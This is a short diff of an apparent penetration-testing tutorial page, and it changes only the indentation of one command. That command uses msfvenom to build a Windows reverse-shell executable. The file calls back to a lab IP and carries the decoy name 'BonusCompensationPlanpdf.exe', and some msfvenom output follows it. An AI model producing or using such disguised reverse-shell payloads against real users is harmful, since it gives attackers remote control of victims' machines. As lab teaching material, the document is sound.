@@ -161,7 +161,7 @@ This same concept can be used to create payloads for various platforms, includin
 
 {% code overflow="wrap" fullWidth="true" %}
 ```bash
- msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
 
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x86 from the payload
